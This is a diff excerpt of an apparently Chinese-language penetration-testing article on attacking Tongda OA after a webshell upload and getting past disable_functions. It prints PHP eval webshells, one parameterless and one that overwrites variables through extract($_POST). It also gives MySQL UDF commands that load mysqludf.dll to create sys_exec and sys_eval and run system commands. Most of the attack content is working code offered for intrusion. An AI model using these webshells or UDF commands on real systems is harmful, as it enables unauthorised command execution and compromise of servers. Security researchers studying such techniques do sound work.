@@ -48,14 +48,14 @@ RCE过的朋友都知道，通达OA在传马之后，常常出现disable_functio
   
 无参RCE在之前发过相关文章  
 ```
-<?php eval(reset(array_reverse(current(get_defined_vars()))));?>
+<?php eval(reset(array_reverse(current(get_defined_vars()))));?>
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNViaxpBVAkrCVl5Ee4VxbBibcQ1n67fiblNpok1jTrYEd2gZHbrqfEia2n4A/640?wx_fmt=png&from=appmsg "")  
   
 变量覆盖如下：  
 ```
-<?php 
+<?php 
 extract($_POST);
 eval($s);
 ?>
@@ -113,9 +113,9 @@ E:/MYOA/webroot/inc/oa_config.php
   
 下面进行udf利用  
 ```
-create function sys_exec RETURNS int soname 'mysqludf.dll';
-create function sys_eval returns string soname 'mysqludf.dll';
-select sys_eval("whoami");
+create function sys_exec RETURNS int soname 'mysqludf.dll';
+create function sys_eval returns string soname 'mysqludf.dll';
+select sys_eval("whoami");
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/8nIFQgfd1WguQQTXSvvISMRCSlTEvVNV2A6oD8GPUQypLGs9kQYK1Ficm7f56XE5qlrnyDux7Lfshrn1UTyzxvQ/640?wx_fmt=png&from=appmsg "")  
